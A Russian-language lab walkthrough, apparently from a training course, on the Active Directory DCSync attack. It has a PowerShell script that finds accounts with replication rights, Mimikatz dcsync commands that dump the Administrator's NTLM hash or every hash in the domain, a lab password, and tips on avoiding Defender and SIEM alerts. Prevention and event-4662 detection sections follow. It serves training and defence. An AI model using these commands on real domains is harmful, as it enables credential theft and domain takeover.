=====================================================================
* Руководство *
***************

Это пошаговое руководство, цель которой — продемонстрировать проблему, а не подробно описать атаку.

Атака будут выполняться с предоставленных машин Windows 10 (WS001) и Kali Linux.
Предполагается, что злоумышленник уже получил remote code execution (или что-то подобное) на этой машине Windows 10 (WS001).
Пользователь, который, как мы предполагаем, скомпрометирован, — это Боб, обычный пользователь в Active Directory без назначенных специальных разрешений.

Окружение состоит из следующих машин и соответствующих им IP-адресов:

	-	DC1		172.16.18.3
	-	DC2		172.16.18.4
	-	Server01	172.16.18.10
	-	PKI		172.16.18.15
	-	WS001		DHCP или 172.16.18.25 (в зависимости от раздела)
	-	Kali Linux	DHCP или 172.16.18.20 (в зависимости от раздела)

Если надо подключиться к любой из управляющих машин AD сервера (к примеру - DC1)

	i)		Поключаемся к хосту жертвы через RDP
	ii)		Пуск -> Windows Accessories -> Remote Desktop
	iii)		Computer	=	DC1 ip address
			User Name	=	Имя пользователя (к примеру htb-student)
	iv)		Пароль введем позже (будет предоставлен запрос)
	v)		Соглашаемся на устанвку соединения
	
=====================================================================
* Легенда *
***********

DCSync — это атака, которую используют злоумышленники, чтобы выдавать себя за контроллер домена и выполнять репликацию с целевым контроллером домена для извлечения хэшей паролей из Active Directory.
Атака может быть выполнена как с точки зрения учетной записи пользователя, так и компьютера, если им назначены необходимые разрешения, а именно:

	-	Replicating Directory Changes
	-	Replicating Directory Changes All

Вот пара ссылок, где можно прочитать о данном виде атаки:

	-	https://blog.netwrix.com/2021/11/30/what-is-dcsync-an-introduction/
	-	https://blog.netwrix.com/2022/09/30/extracting-user-password-data-with-mimikatz-dcsync/

=====================================================================
* Схема атаки *
***************

Забегая наперед, скажу, что мы будем использовать пользователя Rocky (пароль которого Slavi123) для демонстрации атаки DCSync.
Однако, чтобы узнать, какие из пользователей уязвимы для данного рода атаки, необходимо их сперва определить
Для этого можно использовать следущий скрипт

	#Get all permissions in the domain, filtered to the two critical replication permissions represented by their GUIDs
	Import-Module ActiveDirectory

	# Replace with distinguished name of your domain
	cd 'AD:DC=eagle,DC=local' 
	$AllReplACLs = (Get-AcL).Access | Where-Object {$_.ObjectType -eq '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' -or $_.ObjectType -eq '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'}

	#Filter this list to RIDs above 1000 which will exclude well-known Administrator groups
	foreach ($ACL in $AllReplACLs)
	{
    		$user = New-Object System.Security.Principal.NTAccount($ACL.IdentityReference)
    		$SID = $user.Translate([System.Security.Principal.SecurityIdentifier])
    		$RID = $SID.ToString().Split("-")[7]
    		if([int]$RID -gt 1000)
    		{
        		Write-Host "Permission to Sync AD granted to:" $ACL.IdentityReference
    		}
	}

	#Get back to local domain name
	cd 'C:'

Результатом испольщования данного скрипта будет следующий вывод на экране

	Permission to Sync AD granted to: <domain_name>\<user_name>
	Permission to Sync AD granted to: <domain_name>\<user_name>

Можно конечно использовать и различные командлеты powershell (чтобы не привлекать внимание Windows Defender, если потребутся изменять настройки запуска исполняемых файлов, или настроек различных SIEM/LOG-модулей, которые настроены на отслеживания запуска определнных комндлетов)
***	Но, не факт, что система жертвы уже имеет некоторые предустановленные модули, позволяющие использовать только лишь командлеты
Один из таких комндлетов, который выдаст список всех пользователей домена (что в принципе является подозрительным, когда его запускает обычный пользователь)

	Get-ADUser -Filter *
	или
	Get-Get-ADOrganizationalUnit -Filter * 

***	Только не забываем изменить политику запуска исполняемых файлов (если необходимо) и импортировать данный скрипт с базу командлетов системы

		PS C:\...\...\...> Set-ExecutionPolicy -ExecutionPolicy <type_of_executionpolicy> -Scope <type_of_scope>

	Для импорта скрипта в базу данным командлетов системы, чтобы образаться к скрпту, используя его название, надо применить следующую команду

		 PS C:\...\...\...> Import-Module <script_name.ps1>

Далее нам нужно запустить новую командную оболочку (из-под cmd), работающую от имени найденого пользователя используя утилиту runas
Но для этого, нам надо знать пароль данного пользователя

	C:\...\...\...>runas /user:<domain_name>\<user_name> cmd.exe

Затем нам нужно использовать Mimikatz, как один из главных инструментов с реализацией для выполнения DCSync.
Мы можем запустить его, указав имя пользователя, хеш пароля которого мы хотим получить в случае успешной атаки, в данном случае пользователя «Администратор»

	C:\Mimikatz>mimikatz.exe

	mimikatz # lsadump::dcsync /domain:<domain_name>.local /user:Administrator

В полученном результате нас интересует раздел Credentials

	Hash NTLM: fcdc65703dd2b0bd789977f1f3eeaecf

Можно указать параметр /all вместо конкретного имени пользователя, что позволит выгрузить хэши всей среды AD.

После получения NTLM hash мы можем выполнить pass-the-hash атаку и аутентифицироваться на любом контроллере домена.

=====================================================================
* Предотвращение/защита *
*************************

То, что DCSync "обходит/взламывает", является обычной операцией в средах Active Directory, поскольку репликации происходят между контроллерами домена постоянно
Поэтому предотвращение DCSync из коробки не является вариантом.
Единственным методом предотвращения этой атаки является использование таких решений, как RPC Firewall, сторонний продукт, который может блокировать или разрешать определенные вызовы RPC с надежной детализацией.
Например, используя RPC Firewall, мы можем разрешить репликации только с контроллеров домена.

=====================================================================
* Обнаружение *
***************

Обнаружение DCSync легко, поскольку каждая репликация контроллера домена генерирует событие с идентификатором 4662 (An operation was performed on an object).
Мы можем немедленно обнаружить ненормальные запросы, отслеживая этот идентификатор события и проверяя, является ли учетная запись инициатора контроллером домена.
Анализируя данное событие, особое внимание следут обратить на следующие разделы события:

	-	Account Name (in Subject category)	-	Имя пользовател, осуществлявшего воздействие на объект и это длжен быть Domain Controller, а не обычные пользоатель
	-	Properties (in Operation category)	-	Будет присутствовать запись Control Access {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2, либо 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}
	
Поскольку репликации происходят постоянно, мы можем избежать ложных срабатываний, обеспечив следующее:

	-	В событии присутствует либо свойство 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2, либо 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2.
	-	Внесение в белый список систем/учетных записей с (действительной) деловой причиной для репликации
		Например Azure AD Connect (эта служба постоянно реплицирует контроллеры домена и отправляет полученные хэши паролей в Azure AD

Более детальную о расширенныз правах доступа можно найти тут	-	https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/1522b774-6464-41a3-87a5-1e5633c3fbbb

=====================================================================
* Ловушка/Honeypot *
********************

К сожалению вариантов с ловушкой для данного вида атаки представлено не было